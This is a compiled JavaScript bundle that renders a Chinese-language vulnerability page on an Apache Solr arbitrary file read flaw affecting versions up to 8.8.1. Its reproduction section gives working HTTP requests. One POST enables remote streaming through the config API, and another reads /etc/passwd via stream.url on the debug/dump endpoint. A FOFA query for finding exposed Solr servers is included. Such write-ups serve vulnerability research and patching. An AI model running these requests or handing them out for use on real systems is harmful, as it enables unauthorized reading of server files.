(window.webpackJsonp=window.webpackJsonp||[]).push([[300],{2814:function(a,s,e){a.exports=e.p+"assets/img/deaf982e-2ddb-4021-9b5b-21ac946a910a.41ed15e0.png"},2815:function(a,s,e){a.exports=e.p+"assets/img/image-20220307142829893.660fedbc.png"},2816:function(a,s,e){a.exports=e.p+"assets/img/image-20220307142740665.fd37316e.png"},3560:function(a,s,e){"use strict";e.r(s);var t=e(65),r=Object(t.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"apache-solr-config-任意文件读取漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#apache-solr-config-任意文件读取漏洞"}},[a._v("#")]),a._v(" Apache Solr config 任意文件读取漏洞")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("Apache Solr <= 8.8.1")]),s("br"),a._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[s("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU29sciI%3D"}},[a._v('FOFA: app="APACHE-Solr"')])],1),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("访问 Solr Admin 管理员页面")]),a._v(" "),s("p",[s("img",{attrs:{src:e(2814),alt:"deaf982e-2ddb-4021-9b5b-21ac946a910a"}})]),a._v(" "),s("p",[a._v("获取core的信息")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("/solr/admin/cores?indexInfo=false&wt=json\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:e(2815),alt:"image-20220307142829893"}})]),a._v(" "),s("p",[a._v("发送请求")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v('POST /solr/core/config \nContent-Type: application/json\n\n{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br")])]),s("p",[a._v("再进行文件读取")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("POST /solr/core/debug/dump?param=ContentStreams \n\nstream.url=file:///etc/passwd\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("p",[s("img",{attrs:{src:e(2816),alt:"image-20220307142740665"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);